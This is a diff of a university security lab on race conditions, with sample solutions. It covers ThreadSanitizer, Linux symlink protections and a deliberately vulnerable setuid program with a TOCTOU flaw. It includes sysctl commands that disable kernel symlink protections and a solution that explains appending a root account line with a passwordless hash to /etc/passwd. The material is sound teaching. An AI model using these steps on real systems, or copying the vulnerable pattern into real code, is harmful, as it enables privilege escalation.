@@ -1,216 +1,807 @@
 ---
-title:  CITS3007 lab 9 (week 11)&nbsp;--&nbsp;Passwords&nbsp;--&nbsp;solutions
+title:  CITS3007 lab 9 (week 11)&nbsp;--&nbsp;Race conditions&nbsp;--&nbsp;solutions
 ---
 
-## 1. Introduction
-
-Passwords are one of the oldest,[^age] most widely used mechanisms for authenticating users -- found
-everywhere from web apps and APIs, to operating systems and IoT devices. Other authentication
-methods have since become available (such as biometric logins and hardware tokens), but
-passwords still underpin access control for the vast majority of services.
-
-[^age]: Roman soldiers used "watchwords" to identify each other (especially at night, to
-  distinguish allies from potential enemies). These watchwords would often be changed daily for
-  security. See Polybius's *Histories*, translated by E.S. Shuckburgh (London: Macmillan,
-  1889), p 487, available at [Project
-  Gutenberg](https://www.gutenberg.org/files/44125/44125-h/44125-h.htm#Page_487).
+## Background
 
 
 
-However, using passwords alone is increasingly considered insecure. Modern best practice
-favours [multi-factor authentication][mfa] (MFA), where a password is combined with
-something the user *has* (like a phone or hardware key) or something they "*are*" (like a
-fingerprint). Relying on passwords alone leaves systems too easily vulnerable to
-["credential stuffing"][cs] (attackers re-using stolen passwords) and brute-force attacks.
+This lab explores *race condition* vulnerabilities.  A race condition is any situation where
+the timing or order of events affects the correctness of programs or code. For a race
+condition to occur, some form of *concurrency* must exist -- e.g., multiple processes or
+threads of control running at the same time -- as well as some sort of mutable resource. A
+race condition occurs when the same data is accessed and written by multiple threads of
+control or processes.
 
-[mfa]: https://en.wikipedia.org/wiki/Multi-factor_authentication
-[cs]: https://en.wikipedia.org/wiki/Credential_stuffing
+A common sort of resource for programs to use is files in the filesystem.  If a `setuid`
+program that uses files has a race condition vulnerability, attackers may be able to run a
+parallel process and attempt to subvert the program behaviour.
 
-The way we hash and store passwords has evolved significantly in the past few decades.
-Simple hashing algorithms like [MD5][md5] or [SHA-1][sha1] are no longer considered
-acceptable for use in securing systems. Today, secure systems use slow, salted,
-[key-stretching][ks]
-algorithms like **[bcrypt][bcrypt]**, **[scrypt][scrypt]**, or **[Argon2][argon2]** to make
-attacks computationally expensive.
+**Question 1(a)**
 
-Guidelines have also shifted. Prior to the late 2010s, typical advice for generating
-passwords was that they should:
+:   Is a program with a race condition always guaranteed to work correctly?
+    Is an attack on a program with a race condition always guaranteed to succeed?
 
-- Have minimum "complexity" requirements, requiring a mix of uppercase and lowercase
-  letters, numbers, and punctuation
-- Avoid dictionary words
-- Be [changed frequently][passpol] (for instance, every 30, 60 or 90 days -- even without any evidence
-  of compromise)
-- Never be reused across systems (even though it's impossible for a user to manage a large
-  number of passwords without the help of a [password manager][pm] -- and these were less
-  commonly used, at the time)
-- Use "security questions" (e.g. a user's mother's maiden name, or first pet) as backup or
-  secondary authentication -- even though answers to these questions can often be guessed or
-  found out.
-
-[pm]: https://en.wikipedia.org/wiki/Password_manager
-[passpol]: https://en.wikipedia.org/wiki/Password_policy
-
-Much of the burden was placed on users to come up with strong passwords, remember dozens of
-them, rotate them regularly, and never write them down.
-
-**Exercise**
-
-:   See if you can find the password guidelines for some of the organizations
-    you work or study at. How many of them use practices from the list above?
-
-**Question**
-
-:   Of the secure design principles we've looked at in lectures, which one
-    do the guidelines above violate?
 
 
 
 <div class="solutions">
 
-The principle of psychological acceptability.
+::: block-caption
 
-Psychological acceptability is one of Saltzer and Schroeder's classic principles of secure
-system design, and suggests that security mechanisms should not make the system harder to use
-than necessary, and should fit naturally into how users think and behave.
+Sample solution
 
-But old-style password rules make passwords:
+:::
 
-- hard to remember: humans are bad at memorising lots of complex, arbitrary strings.
-- hard to type correctly: instead of being English or other natural language words, they
-  contain digits and punctuation in unusual places.
-- tempting to reuse, or write down: if people are forced to change passwords frequently, or
-  aren't encouraged to use a password manager, they'll likely reuse passwords with slight
-  variations, or write the passwords down (e.g. on a sticky note affixed to the computer
-  screen).
+The answer to both questions is "No". By definition, a program with a race condition only
+works correctly when events occur in the "right" order, and they are not guaranteed to do
+so. An attack on such a program depends on events ocurring in the "right" order for the
+attacker, and this, also, is not guaranteed to happen.
+
+
+</div>
+
+
+
+**Question 1(b)**
+
+:   What is a symlink attack? See if you can find out how they are typically defined,
+    and how they can be protected against.
+    How do they relate to race conditions? If a race condition
+    is involved, identify the resource being altered.
+
+
+
+<div class="solutions">
+
+::: block-caption
+
+Sample solution
+
+:::
+
+Symlink attacks were described in lab 4, on `setuid` vulnerabilities, and further
+information is available [in the CAPEC database][capec-symlink] which describes different
+attack patterns.
+They occur when an attacker creates a symbolic link so that a vulnerable program accesses
+the link's endpoint (say, `/etc/some_sensitive_file`) on the mistaken assumption it is
+accessing a file at the link's source path.
+The result is that the vulnerable program reads from or writes to an incorrect file.
+
+[capec-symlink]: https://capec.mitre.org/data/definitions/132.html
+
+Symlink attacks need not involve race conditions: *any* attack where the attacker induces a
+program to read from or write to an incorrect file by using a symbolic link
+counts as a symlink attack. However, a common sort of vulnerability is where:
+
+i.  some privileged (e.g. `setuid`) program checks to see whether it should
+    access some file *F*
+#.  the program later does access file *F* (either reading or writing it)
+    based on the check in step (i), and steps (i) and (ii) are not atomic
+#.  an attacker can unlink file *F* and replace it with a symbolic link to a different
+    file (call it *E*) which the attacker should not have access to.
+
+This counts as a race condition because correct operation of the program will only happen
+if the file is not replaced between steps (i) and (ii); but since they are not guaranteed to
+be atomic, there is an interval between the steps, and the file can be replaced during that
+interval.
+This sort of vulnerability is sometimes called a [symlink
+race](https://en.wikipedia.org/wiki/Symlink_race), and it is an example of a
+[TOCTOU vulnerability][toctou] (which we have covered earlier).
+
+[toctou]: https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use
+
+How to defend against the attack varies on the logic of the vulnerable program, but the
+general approaches are:
+
+-   Avoid the TOCTOU bug by only accessing the file path *once*: obtain a file handle by
+    opening the file, and check permissions using the open file handle.
+-   Protect the target file *F* by putting it in a directory an attacker does not have
+    access to.
+
+The resource being accessed as part of the race condition is the file *F*.
+
+Symlink attacks are fairly common. Googling for `site:cve.org symlink` results in over a
+thousand hits.
+
+</div>
+
+
+
+<!--
+This lab covers the following topics:
+
+- Race condition vulnerability
+- Sticky symlink protection
+- Principle of least privilege
+
+-->
+<!--
+lab questions to add
+
+Checkpoint 1. What is a race condition?
+Checkpoint 2. What is the general target for race condition attacks?
+Checkpoint 3. What is the TOCTTOU (Time Of Check To Time Of Use) design flaw?
+Checkpoint 4. What is the relationship between TOCTTOU design flaw and the race condition attack?
+Checkpoint 5. Explain if a race condition is always guaranteed to succeed.
+Checkpoint 6. What is a symlink / path attack?
+Checkpoint 7. How is a symlink / path attack related to a race condition?
+-->
+
+
+## Data races and ThreadSanitizer
+
+In multithreaded programs, it may be possible for multiple threads to access some memory
+location. If two threads access the same variable concurrently and at least one of the
+accesses is a write, then that is a *data race*, and it is undefined behaviour in C.
+
+Save the following program as `race1.c`, and compile it with:
+
+```bash
+gcc -std=c11 -pedantic-errors -Wall -Wextra -pthread -o race1 race1.c
+```
+
+Program `race1.c`:
+
+```c
+#include <stdio.h>
+#include <pthread.h>
+#include <stdlib.h>
+
+int COUNTER = 0;
+
+// func does no synchronization of `COUNTER`
+void* increment_counter(void* arg) {
+  (void) arg; // cast away arg to avoid unused parameter warnings
+  for (int i = 0; i < 1000 * 1000; ++i) {
+    COUNTER++;
+  }
+  return NULL;
+}
+
+int main(void) {
+  pthread_t thread1, thread2;
+
+  // create two threads
+  pthread_create(&thread1, NULL, increment_counter, NULL);
+  pthread_create(&thread2, NULL, increment_counter, NULL);
+
+  // wait for both threads to finish
+  pthread_join(thread1, NULL);
+  pthread_join(thread2, NULL);
+
+  // Print the final value of the COUNTER
+  printf("Final COUNTER value: %d\n", COUNTER);
+
+  return 0;
+}
+```
+
+This program uses the Pthreads library to control program threads. 
+
+Two threads are created using the `pthread_create` function, and `main` waits for them to
+finish by calling `pthread_join`. Both threads try to increment the variable
+`COUNTER` 1 million times. However, they are doing so without any sort of synchronization, so this counts as a data
+race and is undefined behaviour.
+
+If the threads incremented `COUNTER` "correctly", we'd expected `COUNTER` to have a
+final value of 2,000,000. 
+
+Run the program, and see what result you get.
+
+Because reads and writes of the variable can overlap
+unpredictably, we will typically see a value greater than 1 million, but less than 2
+million. (Technically, any sort of behaviour is *possible*, because our program is invoking undefined
+behaviour; but using GCC should reliably produce a value in that range.)
+
+Because data races are undefined behaviour, a compiler is allowed to assume that they never
+occur. Furthermore, during the course of executing a function, a compiler is allowed to use
+existing variables like `COUNTER` for temporary storage it might need, as long as it restores
+them by the time the function is ended. Combined, these two facts could mean that a variable
+like `COUNTER` could end up with "junk" values in it that bear no resemblance to
+what we expect. (Although in the above program, this is
+actually unlikely.)
+
+<!--
+source:
+https://web.archive.org/web/20160307150040/https://software.intel.com/en-us/blogs/2013/01/06/benign-data-races-what-could-possibly-go-wrong
+-->
+
+We can detect this race condition using [ThreadSanitizer][tsan] (TSan, for short).
+Compile again with the following command. (When compiling, we add the
+`-g` option to improve error messages printed by TSan, but you can also leave it off.)
+
+```bash
+gcc -g -std=c11 -pedantic-errors -Wall -Wextra -fsanitize=thread -pthread -o race1 race1.c
+```
+
+[tsan]: https://github.com/google/sanitizers/wiki/ThreadSanitizerCppManual
+
+Then run the program. You should see output something like the following:
+
+```plain
+  ==================
+  WARNING: ThreadSanitizer: data race (pid=590418)
+    Read of size 4 at 0x561c214a7014 by thread T2:
+      #0 operation2 /home/vagrant/race1.c:11 (race1+0x12f1)
+  
+    Previous write of size 4 at 0x561c214a7014 by thread T1:
+      #0 operation1 /home/vagrant/race1.c:11 (race1+0x12ac)
+  
+    Location is global 'COUNTER' of size 4 at 0x561c214a7014 (race1+0x000000004014)
+  
+    Thread T2 (tid=590421, running) created by main thread at:
+      #0 pthread_create ../../../../src/libsanitizer/tsan/tsan_interceptors_posix.cpp:969 (libtsan.so.0+0x605b8)
+      #1 main /home/vagrant/race1.c:21 (race1+0x1388)
+  
+    Thread T1 (tid=590420, finished) created by main thread at:
+      #0 pthread_create ../../../../src/libsanitizer/tsan/tsan_interceptors_posix.cpp:969 (libtsan.so.0+0x605b8)
+      #1 main /home/vagrant/race1.c:20 (race1+0x1367)
+  
+  SUMMARY: ThreadSanitizer: data race /home/vagrant/race1.c:11 in increment_counter
+  ==================
+  Final COUNTER value: 2000000
+  ThreadSanitizer: reported 1 warnings
+```
+
+When we compile with ThreadSanitizer, our program is instrumented (i.e., extra instructions
+are added) so that it keeps track of the accesses each thread makes to memory.
+By default, the last $2^{17}$, or roughly 128,000, accesses are tracked. It is possible to
+alter this number when your program is invoked. The following invocation
+
+```
+$ TSAN_OPTIONS="history_size=3" ./race1
+```
+
+will double the number of accesses tracked.[^tsan-options]
+If the ThreadSanitizer finds that more than one of those accesses is to the same memory
+location, and at least one of those accesses was a write, then this will be flagged as being a race condition.
+
+[^tsan-options]: See [ThreadSanitizerFlags](https://github.com/google/sanitizers/wiki/ThreadSanitizerFlags)
+  for a list of all the options that can be passed to ThreadSanitizer.
+  As the page dedcribes, `history_size=0` tracks the last 32K memory accesses,
+  and each increment to `history_size` doubles the number of memory accesses tracked.
+
+**Question 1(a)**
+
+:   Find out what resources are used by a program with TSan enabled, compared with a
+    program which does not have it enabled.
+
+
+
+<div class="solutions">
+
+::: block-caption
+
+Sample solution
+
+:::
+
+According to the documentation at
+<https://clang.llvm.org/docs/ThreadSanitizer.html>, a sanitized program uses more memory:
+
+> At the default settings the memory overhead is 5x plus 1Mb per each thread.
 
 </div>
 
 
 
 
-By 2017, many standards bodies, such as [NIST][nist], had abandoned these practices.
-They resulted in users:
+However, ThreadSanitizer is not infallible, as we will demonstrate.
+Here is a second program -- save it as `race2.c`:
 
-- Coming up with passwords like `Tr0ub4dor&3`, which are hard for humans to remember (which
-  of the "o's" was actually a "`0`"?), and are not especially resistant to cracking.
-- Incrementing passwords (`Password1`, `Password2`, etc.), reusing old ones, or writing them
-  down, to deal with frequent requests to change passwords.
+```c
+#include <pthread.h>
+#include <stdlib.h>
+#include <unistd.h>
 
-In short, as the [comic XKCD explains][xkcd], these practices trained people to use
-passwords that are hard for humans to remember, but easy for computers to guess.
+int GLOBAL;
 
-[nist]: https://www.nist.gov
-[xkcd]: https://xkcd.com/936/
+void* operation1(void *x) {
+  GLOBAL = 99;
+  return x;
+}
 
-```{=html}
-<div style="display: flex; justify-content: center; align-items: center; ">
+int main(void) {
+  pthread_t t;
+  pthread_create(&t, NULL, operation1, NULL);
+  GLOBAL = 100;
+  pthread_join(t, NULL);
+  if (GLOBAL == 99)
+    return EXIT_SUCCESS;
+  else
+    return EXIT_FAILURE;
+}
 ```
 
-[![](https://imgs.xkcd.com/comics/password_strength.png)](https://xkcd.com/936/)
+Compile it as follows:
 
-```{=html}
+```bash
+$ gcc -g -std=c11 -pedantic-errors -Wall -Wextra -pthread -o race2 race2.c
+```
+
+In this program, a thread is spawned which sets the value of `GLOBAL` to 99, while the
+`main` function concurrently sets it to 100 -- this again, is a data race. Typically, the
+`main` function will "win", and the value will be 100, but sometimes not. We can demonstrate
+this by running the following Bash code:
+
+```bash
+$ i=0 ; while ./race2 ; do echo $i ; i=$((i+1)) ; done
+```
+
+In the cases where the `main` function "wins", `race2` will exit with exit code 1, and the
+while loop will continue. However, if the thread "wins", `race2` will exit with exit code 0,
+and the while loop will halt. If you run the program, you should see the `main` function
+"win" many times, but eventually, the thread will succeed instead -- and the value of `i`
+will show how many times we had to run the program before this happened. (Typical values are
+somewhere in the thousands, but it could sometimes be higher or lower.)
+
+Now compile the program and run it with ThreadSanitizer enabled:
+
+```bash
+$ gcc -g -std=c11 -pedantic-errors -Wall -Wextra -fsanitize=thread -pthread -o race2 race2.c
+$ i=0; while (./race2 ; [ $? -ne 66 ]); do echo $i; i=$((i+1)); done
+```
+
+By default, if TSan detects a race condition, the program exits with exit
+code 66 (see the [TSan options documentation][tsan-options]).
+(We could alter this by invoking our program with, say, `TSAN_OPTIONS="exitcode=3" ./race2`
+if we wanted to force the exit code to be 3 instead.)
+Our `while` loop continues to run until TSan does detect a race condition.
+
+[tsan-options]: https://github.com/google/sanitizers/wiki/ThreadSanitizerFlags
+
+You will typically see that TSan does not always detect a race condition, but eventually
+does.
+Why does TSan not always detect the race? Because sometimes,
+the line `GLOBAL = 100` is executed before the operating system has finished creating a new
+thread at all. In that case, TSan does not "kick in" until the thread is created, and
+doesn't realize that the thread is altering a variable which was also altered in `main`.
+
+**Exercise**
+
+:   The traditional way to protect against a data race in this program would be to
+    either use *atomic types* (i.e. alter the type of `GLOBAL`), or to use *locks*
+    (e.g. mutexes -- "mutual exclusion locks"). See if you can amend the program to
+    use one of these two approaches. Which of these approaches can successfully fix the
+    issue?
+
+
+
+<div class="solutions">
+
+::: block-caption
+
+Sample solution
+
+:::
+
+One approach is to use atomic types. They were introduced in C11, and you can read about them
+[here](https://en.cppreference.com/w/c/atomic).
+We can write the program in that case
+as follows:
+
+
+```c
+#include <pthread.h>
+#include <stdatomic.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+atomic_int GLOBAL;
+
+void* operation1(void *x) {
+  GLOBAL = 99;
+  return x;
+}
+
+int main(void) {
+  pthread_t t;
+  pthread_create(&t, NULL, operation1, NULL);
+  GLOBAL = 100;
+  pthread_join(t, NULL);
+
+  if (GLOBAL == 99)
+    return EXIT_SUCCESS;
+  else
+    return EXIT_FAILURE;
+}
+```
+
+We have added the use of the `<stdatomic.h>` header, and changed `GLOBAL` to be of type
+`atomic_int`.
+
+We can run the following bash code to see if TSan detects a data race (hit ctrl-c to stop
+it):
+
+```bash
+i=0; while (./race2-atomic ; [ $? -ne 66 ]); do echo $i; i=$((i+1)); done
+```
+
+But no data race should be detected; by using atomics, we have removed the data race, and
+our program is well-defined.
+
+::: block-caption
+
+Mutexes
+
+:::
+
+Alternatively, we can use the mutex types from the Pthreads library to protect our
+`GLOBAL` variable.
+
+```c
+#include <pthread.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int GLOBAL;
+pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER; // initialize
+
+void* operation1(void *x) {
+    pthread_mutex_lock(&mutex); // request lock before accessing shared variable
+    GLOBAL = 99;
+    pthread_mutex_unlock(&mutex); // release lock
+    return x;
+}
+
+int main(void) {
+    pthread_t t;
+    pthread_create(&t, NULL, operation1, NULL);
+
+    pthread_mutex_lock(&mutex); // request lock before accessing shared variable
+    GLOBAL = 100;
+    pthread_mutex_unlock(&mutex); // release lock
+
+    pthread_join(t, NULL);
+
+    pthread_mutex_lock(&mutex); // request lock before accessing shared variable
+    int tmp = GLOBAL;
+    pthread_mutex_unlock(&mutex); // release lock
+
+    if (tmp == 99)
+        return EXIT_SUCCESS;
+    else
+        return EXIT_FAILURE;
+}
+```
+
+We can compile and test this with TSan, and again, no data race should be detected.
+
+::: block-caption
+
+"Native" C11 locks
+
+:::
+
+C11 introduces a "native" type of thread which doesn't use the Pthreads API.
+We can rewrite our program using the new API, which is found in `<threads.h>`.
+
+```c
+#include <stdio.h>
+#include <threads.h>
+
+int GLOBAL;
+mtx_t mutex;
+
+int operation1(void *x) {
+    mtx_lock(&mutex); // request lock before accessing shared variable
+    GLOBAL = 99;
+    mtx_unlock(&mutex); // release lock
+    return 0;
+}
+
+int main(void) {
+    thrd_t t;
+    mtx_init(&mutex, mtx_plain); // Initialize the mutex
+
+    thrd_create(&t, operation1, NULL); // Create a thread
+
+    mtx_lock(&mutex); // request lock before accessing shared variable
+    GLOBAL = 100;
+    mtx_unlock(&mutex); // release lock
+
+    thrd_join(t, NULL);
+
+    mtx_lock(&mutex); // request lock before accessing shared variable
+    int global_value = GLOBAL; // Read the value of GLOBAL
+    mtx_unlock(&mutex); // Unlock the mutex after reading the shared variable
+
+    // Check the value of GLOBAL
+    if (global_value == 99)
+        printf("Exit Success\n");
+    else
+        printf("Exit Failure\n");
+
+    mtx_destroy(&mutex); // Destroy the mutex
+    return 0;
+}
+```
+
+Unfortunately, the TSan sanitizer may not work with C11 "native" threads --
+see [here](https://github.com/google/sanitizers/issues/1195).
+
 </div>
+
+
+
+
+## Protection against symlink attacks
+
+Recent versions of Ubuntu (10.10 and later) come with a built-in protection
+against some race condition attacks. Specifically, they mitigate against some
+symbolic link (symlink)
+attacks (which we saw in lectures).
+
+In the CITS3007 development environment, we will create a new user
+(in addition to the "`vagrant`" user we log in as) with their own
+home directory:
+
+```
+$ sudo adduser --disabled-password --gecos '' user2
 ```
 
-## 2. Modern user password best practice
+As that user, we'll create a new file and a symlink to it:
 
-Instead, modern best practices advocate that for user accounts[^password-recs]
 
-- Multi-factor authentication should be required, wherever possible to implement,
-  in order to add a second layer of defence;
-- Users should be encouraged to use passwords made of multiple words or a memorable phrase --
-  they're easier for users to recall and harder for attackers to crack than short, "complex"
-  strings -- or to use a password manager to generate and store strong, unique passwords for
-  every site.
-- There should be no forced rotation of passwords unless a compromise is suspected or confirmed.
-- Users should be prevented from selecting passwords found in data breaches or which follow
-  known weak patterns, reducing the risk of credential stuffing attacks.
+```
+$ sudo su user2 -c 'echo hello > /home/user2/file'
+$ sudo su user2 -c 'ln -s /home/user2/file /home/user2/link'
+```
 
-[^password-recs]: See section 5.1.1, "[Memorized secrets"][memsec] of NIST standard
-  [SP 800-63B][nist-std]
+By default, a user's new files are world readable, so the `vagrant`
+user can read the file and the symlink:
 
-The UK National Cyber Security Centre (NCSC) provides a [helpful page of
-advice][ncsc-advice] for system owners on modern best practices, which is worth reading
-through.
+```
+$ ls -l ~user2
+total 4
+-rw-rw-r-- 1 user2 user2  6 Sep 27 00:31 file
+lrwxrwxrwx 1 user2 user2 16 Sep 27 00:32 link -> /home/user2/file
+$ cat /home/user2/file
+hello
+```
 
-[ncsc-advice]: https://www.ncsc.gov.uk/collection/passwords/updating-your-approach#PasswordGuidance:UpdatingYourApproach-Don'tenforceregularpasswordexpiry
+Note that the permissions of the symlink are "`rwx`" for user, group
+and the "world" -- this is because on Linux, symlinks have no
+"permissions" of their own; permissions are taken from the file being
+linked to.
+
+As `user2`, we'll try removing "world" permissions from the symlink:
+
+```
+$ sudo su user2 -c 'chmod o-r /home/user2/link'
+```
+
+Does this make a difference to the permissions of the `link` file,
+as displayed by `ls`? Can the `vagrant` user still access it?
+
+
+
+<div class="solutions">
+
+::: block-caption
+
+Sample solution
+
+:::
+
+You should observe that the listed permissions stay exactly
+the same, and the `vagrant` user can still read the file contents.
+
+</div>
+
+
+
+Now we'll try making a symlink again, but putting it in the `/tmp` directory:
+
+```
+$ sudo su user2 -c 'ln -s /home/user2/file /tmp/link'
+```
+
+What happens if you execute the command `cat /tmp/link` (as the `vagrant user`)?
+
+
+
+<div class="solutions">
+
+::: block-caption
+
+Sample solution
+
+:::
+
+You should observe that a "Permission denied" error occurs.
+
+</div>
+
+
+
+The `tmp` directory has special permissions, on Unix-like systems. Run `ls -ld /tmp`,
+and you should see output like the following:
+
+```
+$ ls -ld /tmp
+drwxrwxrwt 12 root root 4096 Sep 27 00:38 /tmp
+```
+
+The "`t`" at the end of the permissions means a permission bit called the "sticky bit"
+has been set for the `/tmp` directory.
+When this bit is set on a directory, and some user creates a file in it,
+other users (except for the owner of the directory, and of course `root`) are
+prevented from deleting or renaming the file.
+
+<!--
+  TODO: exercise showing this
+-->
+
+The sticky bit is set on the `/tmp` directory to ensure one user's temporary
+files can't be renamed or deleted by other users.
+In addition to this, the Linux kernel introduced [additional protections][linux-symlinks]:
+symbolic links in world-writable sticky directories (such as `/tmp`) can *only be followed*
+if the follower (i.e., the user executing a command) and the directory owner (that is,
+`root`, in the case of the `/tmp` directory) match the symlink owner.
+
+[linux-symlinks]: https://lwn.net/Articles/390323/
+
+<!--
+  TODO: exercise showing this
+-->
+
 
 <div style="border: solid 2pt blue; background-color: hsla(241, 100%,50%, 0.1); padding: 1em; border-radius: 5pt; margin-top: 1em;">
 
 ::: block-caption
 
-Service accounts
+Are built-in symlink protections enough?
 
 :::
 
-Note that the above advice only applies to *user* accounts used by
-*humans*. Credentials are also needed by so-called [*service accounts*][serv-acc]. These
-are accounts used by automated tools (such as scripts, bots, or background services) in
-order to authenticate themselves, typically to other systems.
 
-For instance, if your computer uses a backup program which backs your files up
-to cloud storage, then it will need some sort of credential -- an account name and
-password, or equivalent[^serv-creds] -- for the cloud provider (such as [Backblaze][bb]
-or [Carbonite][carb]) who provides that backup storage.
-
-[bb]: https://www.backblaze.com
-[carb]: https://www.carbonite.com
-
-For service accounts, different considerations apply, since often:
-
-- Service accounts often use only _one_ factor to authenticate. (Your backup program can't
-  ask you to supply your thumbprint every night at 2 a.m.)
-- Unlike humans, computer programs don't need their credentials to be "memorable" -- they can just
-  as easily use a completely randomly generated string of bytes or characters.
-
-OWASP calls accounts like these
-["Non-Human Identities"][nhi], and notes that [best practice][service-rot] is still to
-ensure the credentials they use regularly expire (or are rotated).
+In general, these built-in protections provided by the kernel
+are **not** sufficient security for safely
+creating temporary files. It's usually best to ensure that only the actual user
+of a process
+can even list or read temporary files: a program should create its own temporary
+*directory* under `/tmp`, to which only the actual user has read, write or execute
+access, and then create needed temporary files within that directory.)
 
 </div>
 
-[^serv-creds]: Sometimes service accounts will authenticate themselves using a password-like
-  value. But often a preferred approach is for them to use a public-private [key pair][kp].
-  When the service account needs to authenticate itself to another system, it sends an
-  authentication request; the foreign system provides a randomly generated value (a
-  "challenge") which the service account then must encrypt with its private key (producing a
-  "response"), proving that it is who it claims to be.  This is basically the same method the
-  Git program uses to [authenticate itself on your behalf to GitHub][github-challenge] if
-  you use an SSH key pair to authenticate -- it's called a [challenge--response protocol][cprot].
+This protection can be removed by running the following command, which alters kernel
+parameters:[^protected-hardlinks]
 
-[memsec]: https://pages.nist.gov/800-63-3/sp800-63b.html#memsecret
-[nist-std]: https://pages.nist.gov/800-63-3/sp800-63b.html
-[serv-acc]: https://en.wikipedia.org/wiki/Service_account
-[nhi]: https://owasp.org/www-project-non-human-identities-top-10/2025/
-[service-rot]: https://owasp.org/www-project-non-human-identities-top-10/2025/7-long-lived-secrets/
-[kp]: https://en.wiktionary.org/wiki/keypair
-[github-challenge]: https://medium.com/@mehul25/how-github-ssh-keys-work-25dcd2452512
-[cprot]: https://csrc.nist.gov/glossary/term/challenge_response_protocol
+[^protected-hardlinks]: A similar sort of protection exists for *hard* links, as
+  well. See <https://sysctl-explorer.net/fs/protected_hardlinks/>.
+
+```
+$ sudo sysctl -w fs.protected_symlinks=0
+```
+
+If you try the previous exercises again, you should see that this time, the `vagrant` user
+*can* run `cat /tmp/link` without a "permission denied" error.
+
+Another protection was added in Ubuntu 20.04: even root cannot write to files in `/tmp` that
+are owned by others. That can be disabled by running the following command:
+
+```
+$ sudo sysctl fs.protected_regular=0
+```
+
+<div style="border: solid 2pt blue; background-color: hsla(241, 100%,50%, 0.1); padding: 1em; border-radius: 5pt; margin-top: 1em;">
+
+::: block-caption
+
+Linux security modules
+
+:::
+
+In earlier versions of the Linux kernel (for instance,
+on Ubuntu 12.04), the "symlinks in sticky-bit directories" protection
+was provided by a Linux security module called "Yama", and
+could be disabled using the following command:
+
+```
+$ sudo sysctl -w kernel.yama.protected_sticky_symlinks=0
+```
+
+If you aren't able to easily run the CITS3007 standard development environment
+(e.g. because you are using an M-series MacOS computer), and are using an earlier version of
+Ubuntu instead, then the "yama" version of the command might work instead.
+
+The Linux kernel provides a security framework consisting of various "hooks"
+which can be used by Linux security *modules*. For instance, normally
+in the Linux kernel, read permissions for a file are only checked
+when a file is opened.
+However, the security framework provides
+"file hooks" which allow security modules to specify checks which
+should be made whenever a read or write is performed on a file descriptor
+(for example, to revalidate the file permissions in case they have changed).
+
+We will not look in detail at how the security framework and
+modules work, but if you are interested,
+the architecture of the framework is described in a [2002 paper][linux-sec],
+and a guide to some of the modules is provided [here][linux-sec-guide].
+
+[linux-sec]: https://www.usenix.org/legacy/event/sec02/wright.html
+[linux-sec-guide]: https://www.starlab.io/blog/a-brief-tour-of-linux-security-modules
+
+<!--
+  "Yama" appears to be named after the Hindu deity: <https://lwn.net/Articles/393008/>
+-->
 
 
-[md5]: https://en.wikipedia.org/wiki/MD5
-[sha1]: https://en.wikipedia.org/wiki/SHA-1
-[ks]: https://en.wikipedia.org/wiki/Key_stretching
-[bcrypt]: https://en.wikipedia.org/wiki/Bcrypt
-[scrypt]: https://en.wikipedia.org/wiki/Scrypt
-[argon2]: https://en.wikipedia.org/wiki/Argon2
+A list of the currently enabled Linux security modules can be printed by
+running
 
-## 3. Cryptography questions and exercises
+```
+$ cat /sys/kernel/security/lsm
+```
 
-See if you can answer the following questions, after reviewing the material on cryptography
-in the lectures.
+In more recent kernels, the "symlinks in sticky-bit directories" protection
+is built into the kernel.
 
-**Question 3(a)**
+</div>
 
-:   Suppose in the CITS3007 SDE you create the MD5 hash of some password, using a command like:
 
-    ```
-    $ printf mypassword | md5sum
-    ```
+## A setuid program { #setuid-append }
 
-    In what format is the hash displayed? How large is the hash, in bytes?
-    How would you write it in C syntax?
+Consider the following program, `append.c`:
+
+```C
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+#include <unistd.h>
+
+int main() {
+  char * filename = "/tmp/XYZ";
+  char buffer[60];
+  FILE *fp;
+
+  // get user input
+  printf("text to append to '%s': ", filename);
+  fflush(stdout);
+
+  scanf("%50s", buffer );
+
+  // does `filename` exist, and can the actual user write
+  // to it?
+  if (!access(filename, W_OK)) {
+    fp = fopen(filename, "a+");
+    fwrite("\n", sizeof(char), 1, fp);
+    fwrite(buffer, sizeof(char), strlen(buffer), fp);
+    fclose(fp);
+    exit(0);
+  }
+
+  printf("No permission\n");
+  exit(1);
+}
+```
+
+It's intended to be a root-owned setuid program, which takes a string
+of input from a user, and appends it to the end of a temporary file
+`/tmp/XYZ` (if that file exists) -- but only if the user who runs the
+program would normally have permissions to write to the file.
+Because the program runs with root privileges (i.e., has an effective
+user ID of `0`), it normally could overwrite any file. Therefore,
+the code above uses the `access` function (discussed in lectures)
+to ensure the *actual* user running the program has the correct
+permissions.
+
+Save the program as `append.c`, and compile it with `make append.o append`.
+Then make it a root-owned setuid program:
+
+```
+$ sudo chown root:root append
+$ sudo chmod u+s append
+```
+
+**Question**
+
+:   At first glance the program may not seem to have any problem.
+    However, there is a race condition vulnerability in the program --
+    can you describe what it is? How might an attacker try to exploit this program?
 
 
 
@@ -222,82 +813,308 @@ Sample solution
 
 :::
 
-If we run the commands, we get output like the following:
+This program has a "TOCTOU" vulnerability, and uses the deprecated `access()` function.
+
+Due to the time window between the file permissions check (`access()`)
+and the file use (`fopen()`),
+there is a possibility that the file used by `access()` is different from the file used by `fopen()`, even
+though they have the same file name `/tmp/XYZ`.
+If a malicious attacker can somehow make `/tmp/XYZ`
+a symbolic link pointing to a protected file, such as `/etc/passwd`, inside the time window, the attacker
+can cause the user input to be appended to `/etc/passwd` and as a result gain root privileges.
+
+How might an attacker exploit this?
+
+If they can alter `/etc/passwd`, they could add an extra line that looks something like this:
 
 ```
-$ printf mypassword | md5sum
-34819d7beeabb9260a5c854bc85b3e44  -
+  sploit:x:0:0::/root:/bin/bash
 ```
 
-The first "word" of output is the actual hash; the "-" represents the name of the file being
-hashed (in this case, "-" represents standard input).
+Here, a new `sploit` account is created, which has root privileges since it has userid 0.
 
-The hash is a sequence of hexadecimal digits, and represents 16 bytes (or 128 bits).
+On its own, this is not quite enough, because the attacker still needs a password to access
+the new `sploit` account.
 
-Each pair of characters in the original hash represents one byte, so
-if stored in C as an array of bytes, we could write it as follows:
+On Ubuntu systems, however, a particular "magic" password value
+is used for [passwordless guest accounts][guest-acc-x],
+and the magic value is `U6aMy0wojraho` (the 6th character is zero, not letter O).
+If the attacker puts this value in the password field of a user entry, they can just
+hit the return key when prompted for a password, and then can log into the user's
+account.
 
-```c
-  // fragment 1
